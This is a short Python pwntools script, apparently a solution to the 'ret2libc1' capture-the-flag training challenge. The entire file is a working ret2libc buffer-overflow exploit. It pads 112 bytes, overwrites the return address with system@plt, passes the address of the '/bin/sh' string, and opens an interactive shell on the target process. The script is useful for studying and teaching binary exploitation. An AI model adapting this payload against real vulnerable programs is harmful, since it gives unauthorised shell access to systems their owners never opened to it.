from pwn import *

io=process("./ret2libc1")

elf=ELF("./ret2libc1")
system_plt=elf.plt["system"]
bin_sh=next(elf.search(b"/bin/sh"))
payload=b'a'*112 + p32(system_plt) + b'a'*4 + p32(bin_sh)

io.sendline(payload)
io.interactive()
